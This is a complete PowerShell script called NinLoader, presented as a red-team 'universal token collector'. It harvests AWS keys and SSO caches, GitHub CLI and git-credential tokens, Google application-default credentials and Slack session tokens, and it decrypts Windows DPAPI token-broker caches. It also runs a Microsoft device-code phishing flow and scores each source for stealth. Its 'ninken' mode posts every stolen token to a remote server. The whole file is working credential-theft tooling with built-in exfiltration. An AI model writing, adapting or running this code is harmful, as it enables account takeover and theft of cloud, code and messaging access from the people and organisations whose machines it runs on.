<#
.SYNOPSIS
    NinLoader — Universal Token Collector (PowerShell)

.DESCRIPTION
    Single-file, zero-dependency PowerShell token collector for Windows environments.
    Collects tokens from AWS, GitHub, Google Cloud, Microsoft 365, and Slack.

    Windows-specific sources: DPAPI, Credential Manager (cmdkey), Registry
    Cross-platform file sources: AWS credentials, GitHub CLI, git-credentials
    Interactive: Microsoft FOCI device code flow via Invoke-RestMethod

.PARAMETER Discover
    Run discovery mode — scan for available token sources without extraction.

.PARAMETER Collect
    Run collection mode — extract tokens from discovered sources.

.PARAMETER Service
    Filter by service: aws, google, github, microsoft, slack

.PARAMETER Source
    Filter by specific source within a service.

.PARAMETER Output
    Output destination: file, stdout, clipboard, ninken

.PARAMETER Path
    Output directory for file output (default: .\tokens)

.PARAMETER Account
    Account hint for interactive collectors.

.PARAMETER Tenant
    Tenant ID for Microsoft collectors.

.PARAMETER Client
    Client ID or FOCI client name for Microsoft device code flow.

.PARAMETER NinkenUrl
    Ninken server URL for ninken output mode.

.EXAMPLE
    .\NinLoader.ps1 -Discover
    .\NinLoader.ps1 -Collect -Service aws -Output stdout
    .\NinLoader.ps1 -Collect -Service microsoft -Source device_code -Tenant common
    .\NinLoader.ps1 -Collect -Output ninken -NinkenUrl https://ninken.local:3000
#>

[CmdletBinding()]
param(
    [switch]$Discover,
    [switch]$Collect,
    [string]$Service,
    [string]$Source,
    [ValidateSet("file", "stdout", "clipboard", "ninken")]
    [string]$Output = "stdout",
    [string]$Path = ".\tokens",
    [string]$Account,
    [string]$Tenant = "common",
    [string]$Client = "teams",
    [string]$NinkenUrl
)

$script:Version = "1.0.0"

# ============================================================================
# Banner
# ============================================================================
function Show-Banner {
    $banner = @"

  _   _ _       _                    _
 | \ | (_)_ __ | |    ___   __ _  __| | ___ _ __
 |  \| | | '_ \| |   / _ \ / _` |/ _` |/ _ \ '__|
 | |\  | | | | | |__| (_) | (_| | (_| |  __/ |
 |_| \_|_|_| |_|_____\___/ \__,_|\__,_|\___|_|
                                        v$($script:Version)
 Universal Token Collector — Ninken Red Team Platform (PowerShell)

"@
    Write-Host $banner -ForegroundColor Cyan
}

# ============================================================================
# FOCI Client IDs
# ============================================================================
$script:FociClients = @{
    "teams"          = "1fec8e78-bce4-4aaf-ab1b-5451cc387264"
    "office"         = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
    "outlook_mobile" = "27922004-5251-4030-b22d-91ecd9a37ea4"
    "onedrive"       = "ab9b8c07-8f02-4f72-87fa-80105867a763"
    "azure_cli"      = "04b07795-a71b-4346-935f-02f9a1efa4ce"
}

# ============================================================================
# Token Data Class
# ============================================================================
function New-TokenResult {
    param(
        [string]$Service,
        [string]$Source,
        [int]$StealthScore = 5,
        [string]$AccountId,
        [string]$Username,
        [string]$DisplayName,
        [string]$TenantId,
        [string]$TenantName,
        [string]$AccessToken,
        [string]$RefreshToken,
        [string]$ClientId,
        [string]$ClientSecret,
        [string]$TokenUri,
        [string[]]$Scopes,
        [string]$ExpiresAt,
        [bool]$Foci = $false,
        [hashtable]$Extra = @{}
    )

    return [PSCustomObject]@{
        ninloader_version = "1.0"
        collected_at      = (Get-Date -Format "o")
        collector         = @{
            service       = $Service
            source        = $Source
            stealth_score = $StealthScore
        }
        account           = @{
            id           = $AccountId
            username     = $Username
            display_name = $DisplayName
            tenant_id    = $TenantId
            tenant_name  = $TenantName
        }
        token             = @{
            platform      = $Service
            access_token  = $AccessToken
            refresh_token = $RefreshToken
            client_id     = $ClientId
            client_secret = $ClientSecret
            token_uri     = $TokenUri
            scopes        = $Scopes
            expires_at    = $ExpiresAt
            foci          = $Foci
            extra         = $Extra
        }
    }
}

# ============================================================================
# Discovery Result
# ============================================================================
function New-DiscoveryResult {
    param(
        [string]$Service,
        [string]$Source,
        [string]$Path,
        [string]$AccountHint,
        [int]$StealthScore = 5,
        [string]$Details
    )

    return [PSCustomObject]@{
        Service      = $Service
        Source        = $Source
        Path         = $Path
        AccountHint  = $AccountHint
        StealthScore = $StealthScore
        Details      = $Details
    }
}

# ============================================================================
# AWS Collectors
# ============================================================================
function Get-AwsCredentials {
    param([switch]$DiscoverOnly)

    $results = @()
    $credFile = Join-Path $env:USERPROFILE ".aws\credentials"
    if (-not $credFile) { $credFile = Join-Path $HOME ".aws\credentials" }

    if (Test-Path $credFile) {
        $content = Get-Content $credFile -Raw
        $currentProfile = $null
        $profiles = @{}

        foreach ($line in ($content -split "`n")) {
            $line = $line.Trim()
            if ($line -match '^\[(.+)\]$') {
                $currentProfile = $Matches[1]
                $profiles[$currentProfile] = @{}
            }
            elseif ($currentProfile -and $line -match '^(\w+)\s*=\s*(.+)$') {
                $profiles[$currentProfile][$Matches[1]] = $Matches[2].Trim()
            }
        }

        foreach ($profileName in $profiles.Keys) {
            $p = $profiles[$profileName]
            if ($p["aws_access_key_id"]) {
                if ($DiscoverOnly) {
                    $results += New-DiscoveryResult -Service "aws" -Source "credentials" `
                        -Path $credFile -AccountHint "profile:$profileName" -StealthScore 5 `
                        -Details "key_id=$($p['aws_access_key_id'].Substring(0, [Math]::Min(8, $p['aws_access_key_id'].Length)))..."
                }
                else {
                    $extra = @{ profile = $profileName }
                    if ($p["aws_session_token"]) { $extra["session_token"] = $p["aws_session_token"] }
                    if ($p["region"]) { $extra["region"] = $p["region"] }

                    $results += New-TokenResult -Service "aws" -Source "credentials" `
                        -StealthScore 5 -AccountId $p["aws_access_key_id"] `
                        -Username "profile:$profileName" `
                        -AccessToken $p["aws_access_key_id"] `
                        -ClientSecret $p["aws_secret_access_key"] -Extra $extra
                }
            }
        }
    }

    # Environment variables
    if ($env:AWS_ACCESS_KEY_ID -and $env:AWS_SECRET_ACCESS_KEY) {
        if ($DiscoverOnly) {
            $results += New-DiscoveryResult -Service "aws" -Source "env" `
                -AccountHint "key_id=$($env:AWS_ACCESS_KEY_ID.Substring(0, [Math]::Min(8, $env:AWS_ACCESS_KEY_ID.Length)))..." `
                -StealthScore 5 -Details "environment variable"
        }
        else {
            $extra = @{}
            if ($env:AWS_SESSION_TOKEN) { $extra["session_token"] = $env:AWS_SESSION_TOKEN }
            if ($env:AWS_DEFAULT_REGION) { $extra["region"] = $env:AWS_DEFAULT_REGION }

            $results += New-TokenResult -Service "aws" -Source "env" -StealthScore 5 `
                -AccountId $env:AWS_ACCESS_KEY_ID `
                -Username "env:$($env:AWS_ACCESS_KEY_ID.Substring(0, 8))..." `
                -AccessToken $env:AWS_ACCESS_KEY_ID `
                -ClientSecret $env:AWS_SECRET_ACCESS_KEY -Extra $extra
        }
    }

    # SSO cache
    $ssoDir = Join-Path $env:USERPROFILE ".aws\sso\cache"
    if (-not $ssoDir) { $ssoDir = Join-Path $HOME ".aws\sso\cache" }
    if (Test-Path $ssoDir) {
        foreach ($f in Get-ChildItem $ssoDir -Filter "*.json") {
            try {
                $data = Get-Content $f.FullName -Raw | ConvertFrom-Json
                if ($data.accessToken) {
                    if ($DiscoverOnly) {
                        $results += New-DiscoveryResult -Service "aws" -Source "sso_cache" `
                            -Path $f.FullName -AccountHint "$($data.accountId)/$($data.roleName)" `
                            -StealthScore 5 -Details "expires=$($data.expiresAt)"
                    }
                    else {
                        $results += New-TokenResult -Service "aws" -Source "sso_cache" `
                            -StealthScore 5 -AccountId $data.accountId `
                            -Username $data.roleName -AccessToken $data.accessToken `
                            -ExpiresAt $data.expiresAt -Extra @{
                                start_url  = $data.startUrl
                                region     = $data.region
                                role_name  = $data.roleName
                                account_id = $data.accountId
                            }
                    }
                }
            }
            catch { }
        }
    }

    return $results
}

# ============================================================================
# GitHub Collectors
# ============================================================================
function Get-GitHubTokens {
    param([switch]$DiscoverOnly)

    $results = @()

    # gh CLI hosts.yml
    $ghDir = if ($env:APPDATA) { Join-Path $env:APPDATA "GitHub CLI" } else { Join-Path $HOME ".config\gh" }
    $hostsFile = Join-Path $ghDir "hosts.yml"

    if (Test-Path $hostsFile) {
        $content = Get-Content $hostsFile -Raw
        $currentHost = $null

        foreach ($line in ($content -split "`n")) {
            if ($line -match '^(\S+):\s*$') {
                $currentHost = $Matches[1]
            }
            elseif ($currentHost -and $line -match '^\s+oauth_token:\s*(.+)$') {
                $token = $Matches[1].Trim()
                if ($DiscoverOnly) {
                    $results += New-DiscoveryResult -Service "github" -Source "gh_cli" `
                        -Path $hostsFile -AccountHint $currentHost -StealthScore 5
                }
                else {
                    $results += New-TokenResult -Service "github" -Source "gh_cli" `
                        -StealthScore 5 -AccessToken $token `
                        -Extra @{ host = $currentHost }
                }
            }
            elseif ($currentHost -and $line -match '^\s+user:\s*(.+)$') {
                # Will be captured on next iteration
            }
        }
    }

    # .git-credentials
    $gitCreds = Join-Path $HOME ".git-credentials"
    if (Test-Path $gitCreds) {
        foreach ($line in (Get-Content $gitCreds)) {
            $line = $line.Trim()
            if ($line -and $line -match 'https?://([^:]+):([^@]+)@(.+)') {
                $user = $Matches[1]
                $token = $Matches[2]
                $host = $Matches[3]

                if ($host -like "*github*") {
                    if ($DiscoverOnly) {
                        $results += New-DiscoveryResult -Service "github" -Source "git_credentials" `
                            -Path $gitCreds -AccountHint "$user@$host" -StealthScore 5
                    }
                    else {
                        $results += New-TokenResult -Service "github" -Source "git_credentials" `
                            -StealthScore 5 -Username $user -AccessToken $token `
                            -Extra @{ host = $host }
                    }
                }
            }
        }
    }

    # Windows Credential Manager
    if ($IsWindows -or $env:OS -eq "Windows_NT") {
        try {
            $cmdkeyOutput = & cmdkey /list 2>&1
            $currentTarget = $null
            foreach ($line in $cmdkeyOutput) {
                if ($line -match 'Target:\s*(.+)$') {
                    $currentTarget = $Matches[1].Trim()
                }
                if ($currentTarget -and $currentTarget -like "*github*") {
                    if ($DiscoverOnly) {
                        $results += New-DiscoveryResult -Service "github" -Source "credential_manager" `
                            -AccountHint $currentTarget -StealthScore 4 `
                            -Details "Windows Credential Manager"
                    }
                    $currentTarget = $null
                }
            }
        }
        catch { }
    }

    return $results
}

# ============================================================================
# Google Collectors
# ============================================================================
function Get-GoogleTokens {
    param([switch]$DiscoverOnly)

    $results = @()

    # Application Default Credentials
    $gcloudDir = if ($env:CLOUDSDK_CONFIG) { $env:CLOUDSDK_CONFIG }
                 elseif ($env:APPDATA) { Join-Path $env:APPDATA "gcloud" }
                 else { Join-Path $HOME ".config\gcloud" }

    $adcFile = Join-Path $gcloudDir "application_default_credentials.json"
    if (Test-Path $adcFile) {
        try {
            $data = Get-Content $adcFile -Raw | ConvertFrom-Json
            if ($DiscoverOnly) {
                $results += New-DiscoveryResult -Service "google" -Source "adc" `
                    -Path $adcFile -StealthScore 5 `
                    -Details "type=$($data.type)"
            }
            else {
                $results += New-TokenResult -Service "google" -Source "adc" `
                    -StealthScore 5 -ClientId $data.client_id `
                    -ClientSecret $data.client_secret `
                    -RefreshToken $data.refresh_token `
                    -TokenUri "https://oauth2.googleapis.com/token" `
                    -Extra @{ type = $data.type; quota_project_id = $data.quota_project_id }
            }
        }
        catch { }
    }

    # credentials.db (SQLite)
    $credDb = Join-Path $gcloudDir "credentials.db"
    if (Test-Path $credDb) {
        if ($DiscoverOnly) {
            $results += New-DiscoveryResult -Service "google" -Source "gcloud" `
                -Path $credDb -StealthScore 5 -Details "SQLite credential store"
        }
        # Note: SQLite reading in PowerShell requires additional tooling
    }

    return $results
}

# ============================================================================
# Microsoft Collectors
# ============================================================================
function Get-MicrosoftTokens {
    param([switch]$DiscoverOnly)

    $results = @()

    # DPAPI Token Broker Cache (Windows only)
    if ($IsWindows -or $env:OS -eq "Windows_NT") {
        $tokenBroker = Join-Path $env:LOCALAPPDATA "Microsoft\TokenBroker\Cache"
        if (Test-Path $tokenBroker) {
            if ($DiscoverOnly) {
                $results += New-DiscoveryResult -Service "microsoft" -Source "dpapi" `
                    -Path $tokenBroker -StealthScore 4 `
                    -Details "DPAPI-protected token cache"
            }
            else {
                # DPAPI decryption via .NET
                try {
                    Add-Type -AssemblyName System.Security
                    foreach ($f in Get-ChildItem $tokenBroker -Filter "*.tbres") {
                        try {
                            $bytes = [System.IO.File]::ReadAllBytes($f.FullName)
                            $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect(
                                $bytes, $null,
                                [System.Security.Cryptography.DataProtectionScope]::CurrentUser
                            )
                            $text = [System.Text.Encoding]::UTF8.GetString($decrypted)
                            # Try to parse as JSON
                            try {
                                $data = $text | ConvertFrom-Json
                                if ($data.access_token -or $data.AccessToken) {
                                    $at = if ($data.access_token) { $data.access_token } else { $data.AccessToken }
                                    $results += New-TokenResult -Service "microsoft" -Source "dpapi" `
                                        -StealthScore 4 -AccessToken $at `
                                        -Extra @{ source_file = $f.FullName }
                                }
                            }
                            catch { }
                        }
                        catch { }
                    }
                }
                catch { }
            }
        }

        # Credential Manager
        try {
            $cmdkeyOutput = & cmdkey /list 2>&1
            $currentTarget = $null
            foreach ($line in $cmdkeyOutput) {
                if ($line -match 'Target:\s*(.+)$') {
                    $target = $Matches[1].Trim()
                    if ($target -like "*microsoft*" -or $target -like "*live.com*" -or $target -like "*office*") {
                        if ($DiscoverOnly) {
                            $results += New-DiscoveryResult -Service "microsoft" -Source "credential_manager" `
                                -AccountHint $target -StealthScore 4 `
                                -Details "Windows Credential Manager"
                        }
                    }
                }
            }
        }
        catch { }
    }

    return $results
}

# ============================================================================
# Microsoft Device Code Flow
# ============================================================================
function Invoke-MicrosoftDeviceCode {
    param(
        [string]$TenantId = "common",
        [string]$ClientName = "teams"
    )

    $clientId = $script:FociClients[$ClientName]
    if (-not $clientId) { $clientId = $ClientName }

    $authority = "https://login.microsoftonline.com/$TenantId"
    $scope = "https://graph.microsoft.com/.default offline_access openid profile"

    Write-Host "Starting device code flow..." -ForegroundColor Yellow
    Write-Host "  Client: $ClientName ($clientId)" -ForegroundColor Gray
    Write-Host "  Tenant: $TenantId" -ForegroundColor Gray

    # Step 1: Get device code
    try {
        $body = @{
            client_id = $clientId
            scope     = $scope
        }
        $response = Invoke-RestMethod -Method Post `
            -Uri "$authority/oauth2/v2.0/devicecode" `
            -Body $body -ContentType "application/x-www-form-urlencoded"
    }
    catch {
        Write-Host "Failed to initiate device code flow: $_" -ForegroundColor Red
        return @()
    }

    Write-Host "`n$($response.message)" -ForegroundColor Green
    Write-Host ""

    # Step 2: Poll for token
    $interval = $response.interval
    if (-not $interval) { $interval = 5 }
    $expiresIn = $response.expires_in
    if (-not $expiresIn) { $expiresIn = 900 }
    $deadline = (Get-Date).AddSeconds($expiresIn)

    while ((Get-Date) -lt $deadline) {
        Start-Sleep -Seconds $interval

        try {
            $tokenBody = @{
                grant_type  = "urn:ietf:params:oauth:grant-type:device_code"
                client_id   = $clientId
                device_code = $response.device_code
            }
            $tokenResult = Invoke-RestMethod -Method Post `
                -Uri "$authority/oauth2/v2.0/token" `
                -Body $tokenBody -ContentType "application/x-www-form-urlencoded"

            if ($tokenResult.access_token) {
                Write-Host "Authentication successful!" -ForegroundColor Green

                return @(New-TokenResult -Service "microsoft" -Source "device_code" `
                    -StealthScore 3 -TenantId $TenantId `
                    -AccessToken $tokenResult.access_token `
                    -RefreshToken $tokenResult.refresh_token `
                    -ClientId $clientId `
                    -TokenUri "$authority/oauth2/v2.0/token" `
                    -Scopes ($tokenResult.scope -split " ") `
                    -Foci $true `
                    -Extra @{
                        client_name = $ClientName
                        token_type  = $tokenResult.token_type
                    })
            }
        }
        catch {
            $err = $_.ErrorDetails.Message | ConvertFrom-Json -ErrorAction SilentlyContinue
            if ($err.error -eq "authorization_pending") {
                Write-Host "." -NoNewline -ForegroundColor Gray
                continue
            }
            elseif ($err.error -eq "slow_down") {
                $interval += 5
                continue
            }
            else {
                Write-Host "`nAuthentication failed: $($err.error_description)" -ForegroundColor Red
                return @()
            }
        }
    }

    Write-Host "`nDevice code expired." -ForegroundColor Red
    return @()
}

# ============================================================================
# Slack Collectors
# ============================================================================
function Get-SlackTokens {
    param([switch]$DiscoverOnly)

    $results = @()

    $slackDir = if ($env:APPDATA) { Join-Path $env:APPDATA "Slack" } else { Join-Path $HOME ".config\Slack" }
    $lsDir = Join-Path $slackDir "Local Storage\leveldb"

    if (Test-Path $lsDir) {
        foreach ($logFile in Get-ChildItem $lsDir -Filter "*.log") {
            try {
                $content = [System.IO.File]::ReadAllText($logFile.FullName)
                if ($content -match 'xoxc-') {
                    if ($DiscoverOnly) {
                        $results += New-DiscoveryResult -Service "slack" -Source "desktop" `
                            -Path $lsDir -StealthScore 5 -Details "xoxc token found"
                        break
                    }
                    else {
                        $matches = [regex]::Matches($content, '(xoxc-[A-Za-z0-9-]+)')
                        $seen = @{}
                        foreach ($m in $matches) {
                            $token = $m.Value
                            if ($token.Length -gt 20 -and -not $seen[$token]) {
                                $seen[$token] = $true
                                $results += New-TokenResult -Service "slack" -Source "desktop" `
                                    -StealthScore 5 -AccessToken $token `
                                    -Extra @{ token_type = "xoxc"; source_file = $logFile.FullName }
                            }
                        }
                    }
                }
            }
            catch { }
        }
    }

    return $results
}

# ============================================================================
# Output Handlers
# ============================================================================
function Write-TokenOutput {
    param(
        [array]$Tokens,
        [string]$OutputType,
        [string]$OutputPath,
        [string]$NinkenUrl
    )

    if (-not $Tokens -or $Tokens.Count -eq 0) {
        Write-Host "No tokens collected." -ForegroundColor Yellow
        return
    }

    switch ($OutputType) {
        "stdout" {
            $Tokens | ConvertTo-Json -Depth 10
        }
        "file" {
            if (-not (Test-Path $OutputPath)) {
                New-Item -ItemType Directory -Path $OutputPath -Force | Out-Null
            }
            foreach ($token in $Tokens) {
                $svc = $token.collector.service
                $src = $token.collector.source
                $ts = Get-Date -Format "yyyyMMdd_HHmmss"
                $filename = "${svc}_${src}_${ts}.json"
                $filepath = Join-Path $OutputPath $filename

                $json = $token | ConvertTo-Json -Depth 10
                [System.IO.File]::WriteAllText($filepath, $json)
                Write-Host "Written: $filepath" -ForegroundColor Green
            }
        }
        "clipboard" {
            $json = $Tokens | ConvertTo-Json -Depth 10
            Set-Clipboard -Value $json
            Write-Host "Copied $($Tokens.Count) token(s) to clipboard." -ForegroundColor Green
        }
        "ninken" {
            if (-not $NinkenUrl) {
                Write-Host "Error: -NinkenUrl required for ninken output" -ForegroundColor Red
                return
            }
            foreach ($token in $Tokens) {
                $url = "$($NinkenUrl.TrimEnd('/'))/api/auth"
                $json = $token | ConvertTo-Json -Depth 10
                try {
                    $response = Invoke-RestMethod -Method Post -Uri $url `
                        -Body $json -ContentType "application/json" -TimeoutSec 30
                    Write-Host "Sent $($token.collector.service)/$($token.collector.source) to $url" -ForegroundColor Green
                }
                catch {
                    Write-Host "Error sending to ${url}: $_" -ForegroundColor Red
                }
            }
        }
    }
}

# ============================================================================
# Main Execution
# ============================================================================

# Show banner
Show-Banner

if ($Discover) {
    # Discovery mode
    $allResults = @()

    $collectors = @{
        "aws"       = { Get-AwsCredentials -DiscoverOnly }
        "github"    = { Get-GitHubTokens -DiscoverOnly }
        "google"    = { Get-GoogleTokens -DiscoverOnly }
        "microsoft" = { Get-MicrosoftTokens -DiscoverOnly }
        "slack"     = { Get-SlackTokens -DiscoverOnly }
    }

    # Device code flows are always "discoverable"
    $allResults += New-DiscoveryResult -Service "microsoft" -Source "device_code" `
        -StealthScore 3 -Details "interactive FOCI device code flow"
    $allResults += New-DiscoveryResult -Service "google" -Source "device_code" `
        -StealthScore 3 -Details "interactive OAuth device code flow"

    foreach ($svc in $collectors.Keys) {
        if ($Service -and $svc -ne $Service) { continue }
        try {
            $allResults += & $collectors[$svc]
        }
        catch {
            Write-Host "[WARN] $svc discovery failed: $_" -ForegroundColor Yellow
        }
    }

    # Display results
    if ($allResults.Count -eq 0) {
        Write-Host "No token sources discovered." -ForegroundColor Yellow
    }
    else {
        Write-Host ("{0,-12} {1,-20} {2,-8} {3,-30} {4}" -f "Service", "Source", "Stealth", "Account", "Details") -ForegroundColor White
        Write-Host ("-" * 100) -ForegroundColor Gray

        foreach ($r in $allResults) {
            $color = if ($r.StealthScore -ge 4) { "Green" } else { "Yellow" }
            Write-Host ("{0,-12} {1,-20} {2,-8} {3,-30} {4}" -f `
                $r.Service, $r.Source, $r.StealthScore, `
                ($r.AccountHint ?? ""), ($r.Details ?? "")) -ForegroundColor $color
        }

        Write-Host "`nTotal: $($allResults.Count) token source(s) found" -ForegroundColor Cyan
    }
}
elseif ($Collect) {
    # Collection mode
    $allTokens = @()

    if ($Service -eq "microsoft" -and $Source -eq "device_code") {
        $allTokens += Invoke-MicrosoftDeviceCode -TenantId $Tenant -ClientName $Client
    }
    else {
        $collectors = @{
            "aws"       = { Get-AwsCredentials }
            "github"    = { Get-GitHubTokens }
            "google"    = { Get-GoogleTokens }
            "microsoft" = { Get-MicrosoftTokens }
            "slack"     = { Get-SlackTokens }
        }

        if ($Service) {
            if ($collectors.ContainsKey($Service)) {
                try {
                    $allTokens += & $collectors[$Service]
                }
                catch {
                    Write-Host "[WARN] $Service collection failed: $_" -ForegroundColor Yellow
                }
            }
            else {
                Write-Host "Error: Unknown service '$Service'" -ForegroundColor Red
                exit 1
            }
        }
        else {
            foreach ($svc in $collectors.Keys) {
                try {
                    $allTokens += & $collectors[$svc]
                }
                catch {
                    Write-Host "[WARN] $svc collection failed: $_" -ForegroundColor Yellow
                }
            }
        }
    }

    Write-TokenOutput -Tokens $allTokens -OutputType $Output -OutputPath $Path -NinkenUrl $NinkenUrl
    Write-Host "`nCollected $($allTokens.Count) token(s)." -ForegroundColor Cyan
}
else {
    Write-Host "Usage: .\NinLoader.ps1 -Discover [-Service <name>]" -ForegroundColor White
    Write-Host "       .\NinLoader.ps1 -Collect [-Service <name>] [-Source <name>] [-Output <type>]" -ForegroundColor White
    Write-Host ""
    Write-Host "Services: aws, google, github, microsoft, slack" -ForegroundColor Gray
    Write-Host "Outputs:  stdout, file, clipboard, ninken" -ForegroundColor Gray
}
